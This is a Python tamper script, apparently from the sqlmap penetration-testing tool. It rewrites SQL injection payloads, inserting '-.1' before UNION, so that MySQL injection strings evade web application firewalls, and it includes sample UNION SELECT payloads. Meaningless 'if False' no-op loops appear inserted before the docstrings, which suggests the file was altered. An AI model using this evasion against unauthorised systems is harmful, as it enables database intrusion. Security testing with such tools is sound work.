"""
Copyright (c) 2006-2023 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""
import os
import re
from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.HIGHEST

def dependencies():
    if False:
        for i in range(10):
            print('nop')
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s" % (os.path.basename(__file__).split('.')[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
    if False:
        for i in range(10):
            print('nop')
    '\n    Replaces instances of UNION with -.1UNION\n\n    Requirement:\n        * MySQL\n\n    Notes:\n        * Reference: https://raw.githubusercontent.com/y0unge/Notes/master/SQL%20Injection%20WAF%20Bypassing%20shortcut.pdf\n\n    >>> tamper(\'1 UNION ALL SELECT\')\n    \'1-.1UNION ALL SELECT\'\n    >>> tamper(\'1" UNION ALL SELECT\')\n    \'1"-.1UNION ALL SELECT\'\n    '
    return re.sub('(?i)\\s+(UNION )', '-.1\\g<1>', payload) if payload else payload